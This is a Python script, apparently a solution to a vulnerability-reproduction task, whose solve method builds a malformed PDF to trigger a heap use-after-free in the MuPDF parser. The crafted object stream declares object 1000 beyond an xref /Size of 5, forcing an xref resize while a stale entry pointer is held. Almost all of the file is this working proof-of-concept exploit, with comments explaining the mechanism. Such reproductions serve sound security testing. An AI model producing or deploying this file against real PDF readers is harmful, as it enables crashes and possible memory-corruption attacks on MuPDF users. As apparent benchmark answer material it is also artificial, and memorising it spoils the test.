import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers a Heap Use After Free in MuPDF.
        # The strategy is to have an object stream (ObjStm) that claims to contain
        # an object with a very high ID (e.g., 1000), while the declared /Size of the
        # xref table is small (5).
        # Accessing an object inside this ObjStm will cause the parser to process the
        # ObjStm header. Encountering object 1000 triggers an xref table resize.
        # If the calling function (pdf_cache_object) holds a pointer to the old xref entry
        # of the object being loaded, this pointer becomes invalid (UAF).
        
        header = b"%PDF-1.7\n"
        binary_marker = b"%\x80\x81\x82\x83\n"
        
        # Object 1: Catalog
        # References Object 3 as the Pages dictionary.
        obj1_content = b"<< /Type /Catalog /Pages 3 0 R >>"
        obj1 = b"1 0 obj\n" + obj1_content + b"\nendobj\n"
        
        # Object 2: Object Stream (ObjStm)
        # Defines two objects: 3 and 1000.
        # Object 3 is valid and needed.
        # Object 1000 is the trigger for the vulnerability (xref resize).
        # Header format: "obj_num offset" pairs.
        # "3 0" -> Obj 3 at offset 0.
        # "1000 0" -> Obj 1000 at offset 0 (sharing content with Obj 3).
        # We pad the header to 16 bytes so /First can be 16.
        stm_header = b"3 0 1000 0      " 
        
        # Content at offset 0: A valid Pages dictionary.
        inner_obj = b"<< /Type /Pages /Count 0 /Kids [] >>"
        
        stm_full = stm_header + inner_obj
        
        # /N 2 means 2 objects in stream. /First 16 is offset to data.
        obj2_dict = (
            b"<< /Type /ObjStm /N 2 /First 16 /Length " + 
            str(len(stm_full)).encode() + b" >>"
        )
        obj2 = b"2 0 obj\n" + obj2_dict + b"\nstream\n" + stm_full + b"\nendstream\nendobj\n"
        
        # Calculate offsets
        offset_1 = len(header) + len(binary_marker)
        offset_2 = offset_1 + len(obj1)
        offset_4 = offset_2 + len(obj2)
        
        # Object 4: XRef Stream
        # Serves as the cross-reference table.
        # /Size 5 covers objects 0-4.
        # Object 1000 is NOT covered by /Size, forcing a resize when encountered.
        # W [1 2 1] -> Fields are 1, 2, 1 bytes.
        
        # Entry 0: Free
        e0 = b'\x00\x00\x00\x00'
        # Entry 1: Offset of Obj 1 (Type 1)
        e1 = b'\x01' + struct.pack('>H', offset_1) + b'\x00'
        # Entry 2: Offset of Obj 2 (Type 1)
        e2 = b'\x01' + struct.pack('>H', offset_2) + b'\x00'
        # Entry 3: Compressed in ObjStm 2, Index 0 (Type 2)
        # This causes the parser to load ObjStm 2 when Obj 3 is requested.
        e3 = b'\x02\x00\x02\x00'
        # Entry 4: Offset of Obj 4 (Type 1)
        e4 = b'\x01' + struct.pack('>H', offset_4) + b'\x00'
        
        xref_stm = e0 + e1 + e2 + e3 + e4
        
        obj4_dict = (
            b"<< /Type /XRef /Size 5 /W [1 2 1] /Root 1 0 R /Length " + 
            str(len(xref_stm)).encode() + b" >>"
        )
        obj4 = b"4 0 obj\n" + obj4_dict + b"\nstream\n" + xref_stm + b"\nendstream\nendobj\n"
        
        # Trailer points to start of XRef stream (Object 4)
        startxref = b"startxref\n" + str(offset_4).encode() + b"\n%%EOF"
        
        return header + binary_marker + obj1 + obj2 + obj4 + startxref
